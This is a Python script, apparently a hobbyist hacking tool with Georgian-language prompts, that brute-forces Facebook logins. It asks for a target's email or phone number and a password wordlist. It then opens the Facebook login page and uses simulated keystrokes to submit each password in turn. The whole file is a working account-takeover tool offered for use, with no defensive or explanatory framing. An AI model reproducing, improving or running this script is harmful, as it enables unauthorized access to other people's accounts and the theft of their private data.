import os
import colorama
from colorama import Fore, Back, Style
colorama.init()
import time
import pynput
from webbot import Browser
from pynput.keyboard import Key, Controller
import time

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos', 'cls'): 
        command = 'cls'
    os.system(command)


clearConsole()

banner = (""" 
*******************************************************************************

▀▄    ▄ ██▄   ███       ███   █▄▄▄▄  ▄     ▄▄▄▄▀ ▄███▄   
  █  █  █  █  █  █      █  █  █  ▄▀   █ ▀▀▀ █    █▀   ▀  
   ▀█   █   █ █ ▀ ▄     █ ▀ ▄ █▀▀▌ █   █    █    ██▄▄    
   █    █  █  █  ▄▀     █  ▄▀ █  █ █   █   █     █▄   ▄▀ 
 ▄▀     ███▀  ███       ███     █  █▄ ▄█  ▀      ▀███▀   
                               ▀    ▀▀▀                  
                                                         

   version: 1.0
   Coded by love from: Deniss#5093
   

*******************************************************************************                                                              
""")



print(Fore.GREEN + banner)

email=input(Fore.BLUE + "\n \nFacebookis emaili/phone number: ")
wordlist=input(Fore.BLUE + "\nSaxeli passlistis: ")


file = open(f'{wordlist}.txt', 'r')
bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
file.close()


web = Browser()
keyboard = Controller()

web.go_to('https://www.facebook.com/login/')
time.sleep(5)
keyboard.press(Key.f6)
keyboard.release(Key.f6)
time.sleep(4)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(4)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(4)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
for brute in bruteforce:
    web.type(email, into="Email")
    web.type(brute, into="Pass")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(1)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(2)
    keyboard.press(Key.f6)
    keyboard.release(Key.f6)
    time.sleep(1)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)

